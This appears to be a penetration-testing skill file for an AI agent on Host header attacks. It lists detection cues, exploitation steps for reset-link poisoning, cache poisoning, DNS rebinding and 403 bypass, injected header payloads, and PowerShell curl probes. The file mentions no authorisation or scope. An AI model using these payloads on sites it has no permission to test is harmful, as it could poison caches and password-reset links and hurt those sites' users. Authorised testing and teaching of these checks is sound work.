---
name: host-header
description: Host header injection and validation bypass — absolute URL injection, DNS rebinding for admin access, password-reset poisoning, cache poisoning via Host. Use when app builds links/redirects or enforces virtual-host routing based on the Host header.
category: misconfig-exposure
---

# Host Header Attacks

## Detection
- Host reflected into: redirect Location, password-reset links, canonical tags, web cache keys.
- Routing differences: same IP serves different apps per Host (vhosting).
- Cache: does the CDN key on full URL incl. Host? (Cache poisoning surface.)

## Exploitation
1. **Absolute URL injection**: `Host: attacker.com` reflected into `<link rel="canonical">` or reset links.
2. **Password reset poisoning**: see password-reset-poisoning skill (Host/X-Forwarded-Host into reset URL).
3. **Admin access via DNS rebinding**: some admin panels validate Host against an allowlist using the raw socket IP; rebinding `admin.example.com` to attacker IP defeats it.
4. **Routing/403 bypass**: if WAF is keyed on Host, send `Host: localhost`, `Host: 127.0.0.1`, or trailing dot `example.com.` to reach internal vhost.
5. **Cache poisoning**: request `/` with `Host: poison.com` — if cache key excludes Host but response body includes it, victims get poisoned.

## Payloads
```
Host: attacker.com
Host: example.com.   (trailing dot)
Host: localhost
Host: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Forwarded-Host: localhost
Forwarded: host=localhost
```

## Tool Commands (Windows)
```powershell
# reflection check
curl.exe -s -i "$U/" -H 'Host: attacker.com' | Select-String -Pattern 'attacker.com' -CaseSensitive:$false
# DNS rebinding / internal vhost probe
curl.exe -s -i "$U/" -H 'Host: localhost'
curl.exe -s -i "$U/" -H 'Host: 127.0.0.1'
# cache poisoning probe
curl.exe -s -i "$U/" -H 'Host: cache-poison.example' | Select-String -Pattern 'x-cache|age' -CaseSensitive:$false
```

## Verification & Evidence
- Host-controlled value appears in a security-relevant response (reset link, redirect, cache body served to others).
- Evidence: two requests (attacker-hosted + victim perspective).